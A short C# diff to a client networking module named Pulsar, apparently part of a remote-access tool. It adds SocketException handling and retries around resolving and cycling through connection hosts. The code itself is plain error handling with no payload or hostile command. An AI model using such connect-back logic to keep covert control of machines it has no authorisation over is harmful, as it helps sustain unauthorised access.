@@ -12,6 +12,7 @@ using System;
 using System.Diagnostics;
 using System.IO;
 using System.Net;
+using System.Net.Sockets;
 using System.Security.Cryptography.X509Certificates;
 using System.Threading;
 
@@ -80,12 +81,34 @@ namespace Pulsar.Client.Networking
 
                     if (!string.IsNullOrEmpty(hostString))
                     {
-                        host = ResolveHost(hostString);
+                        try
+                        {
+                            host = ResolveHost(hostString);
+                        }
+                        catch (SocketException ex)
+                        {
+                            Debug.WriteLine($"SocketException during host resolution: {ex.Message}");
+                            continue;
+                        }
                     }
 
                     if (host == null)
                     {
-                        host = _hosts.GetNextHost();
+                        try
+                        {
+                            host = _hosts.GetNextHost();
+                        }
+                        catch (SocketException ex)
+                        {
+                            Debug.WriteLine($"SocketException while getting next host: {ex.Message}");
+                            continue;
+                        }
+                    }
+
+                    if (host == null)
+                    {
+                        Debug.WriteLine("No valid host available. Retrying...");
+                        continue;
                     }
 
                     try
